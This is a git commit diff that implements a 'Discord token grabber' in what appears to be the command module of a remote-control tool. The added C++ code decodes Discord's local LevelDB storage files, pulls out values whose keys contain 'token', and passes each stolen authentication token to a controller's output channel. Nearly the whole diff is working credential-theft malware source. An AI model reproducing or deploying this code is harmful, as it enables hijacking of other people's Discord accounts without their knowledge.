df6d5bd4b656836d84e37096aa357b084336d6b2
exdeejay <13634296+exdeejay@users.noreply.github.com>
2022-09-22 08:34:28 -0400

    implement discord token grabber; add basic test setup

--- host/src/commands/discord.cpp
+++ host/src/commands/discord.cpp
@@ -1,13 +1,90 @@
 #include "commands.h"
 
-#include <iostream>
-#include <cstdlib>
 #include <filesystem>
 #include <fstream>
-#include <regex>
+#include <snappy.h>
 #include <vector>
 
 using namespace std;
+
+template <typename T = uint64_t>
+T decodeVarint(char *input, size_t *offset) {
+	T ret = 0;
+	size_t i;
+	for (i = 0; i < sizeof(T); i++) {
+		ret |= (input[i] & 127) << (7 * i);
+		if (!(input[i] & 128)) {
+			i++;
+			break;
+		}
+	}
+	*offset += i;
+	return ret;
+}
+
+string parseLDB(const string path) {
+	ifstream file(path, ios::binary | ios::ate);
+	if (!file) {
+		return "";
+	}
+	size_t size = file.tellg();
+	file.seekg(0, ios::beg);
+	vector<char> bytes(size);
+	file.read(bytes.data(), size);
+
+	size_t offset = size - 48;
+	int metaidxOffset = decodeVarint(&bytes[offset], &offset);
+	int metaidxSize = decodeVarint(&bytes[offset], &offset);
+	int idxOffset = decodeVarint(&bytes[offset], &offset);
+	int idxSize = decodeVarint(&bytes[offset], &offset);
+
+	string out;
+	snappy::Uncompress(bytes.data() + idxOffset, idxSize, &out);
+	vector<int> blockOffsets;
+	vector<int> blockSizes;
+
+	offset = 0;
+	while (offset < out.size()) {
+		int sharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
+		int unsharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
+		int valueLength = decodeVarint<uint32_t>(&out[offset], &offset);
+		string keyDelta(out.begin() + offset, out.begin() + offset + unsharedBytes);
+		offset += unsharedBytes;
+		int blockOffset = decodeVarint(&out[offset], &offset);
+		int blockSize = decodeVarint(&out[offset], &offset);
+
+		blockOffsets.push_back(blockOffset);
+		blockSizes.push_back(blockSize);
+	}
+
+	for (int i = 0; i < blockOffsets.size(); i++) {
+		bool valid = snappy::Uncompress(bytes.data() + blockOffsets[i], blockSizes[i], &out);
+		if (!valid) {
+			continue;
+		}
+		offset = 0;
+		string lastKey;
+		while (offset < out.size()) {
+			int sharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
+			int unsharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
+			int valueLength = decodeVarint<uint32_t>(&out[offset], &offset);
+			string keyDelta(out.begin() + offset, out.begin() + offset + unsharedBytes);
+			if (sharedBytes > 0) {
+				keyDelta.insert(keyDelta.begin(), lastKey.begin(), lastKey.begin() + sharedBytes);
+			}
+			lastKey = keyDelta;
+			offset += unsharedBytes;
+
+			if (keyDelta.find("token") != string::npos && valueLength > 0) {
+				string val(out.begin() + offset + 1, out.begin() + offset + valueLength);
+				return val;
+			}
+			offset += valueLength;
+		}
+	}
+
+	return "";
+}
 
 int discordCommand(Controller *ctrl, DiscordCommand cmd) {
 	if (cmd == DiscordCommand::check) {
@@ -24,25 +101,17 @@ int discordCommand(Controller *ctrl, DiscordCommand cmd) {
 		}
 		try {
 			discordPath += "/Local Storage/leveldb";
+			bool gotToken = false;
 			for (auto &p : filesystem::directory_iterator(discordPath)) {
 				if (p.path().extension() == ".ldb") {
-					ifstream file(p.path(), ios::binary);
-					ostringstream buf;
-					buf << file.rdbuf();
-					string contents = buf.str();
-					int idx = contents.find("oken");
-					if (idx != string::npos) {
-						regex findIt("\"[A-Za-z0-9\\.\\_\\-]+\"");
-						smatch sm;
-						string& subcontents = contents.substr(idx);
-						if (regex_search(subcontents, sm, findIt)) {
-							ctrl->sendOut(sm.str());
-							return 0;
-						}
+					string& token = parseLDB(p.path().string());
+					if (token.size() != 0) {
+						gotToken = true;
+						ctrl->sendOut(token);
 					}
 				}
 			}
-			return 1;
+			return !gotToken;
 		} catch (filesystem::filesystem_error &ex) {
 			ctrl->sendErr(ex.what());
 			return -2;
